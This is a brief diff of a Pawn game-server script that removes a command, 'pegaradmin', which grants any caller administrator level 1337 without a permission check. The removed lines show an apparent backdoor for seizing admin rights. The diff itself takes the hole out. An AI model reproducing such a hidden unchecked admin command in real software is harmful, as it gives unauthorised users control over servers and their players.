@@ -46,12 +46,6 @@ GetUserTeam(playerid, team) {
 	return false;
 }
 
-CMD:pegaradmin(playerid, params[]) {	
-  	uInfo[playerid][uAdmin] = 1337;
-	SaveUserInfo(playerid);
-	return true;
-}
-
 CMD:aa(playerid, params[]) {	
   	if(GetPlayerAdmin(playerid) < 1) return SendPermissionMessage(playerid);
 	ShowAdminCmds(playerid);
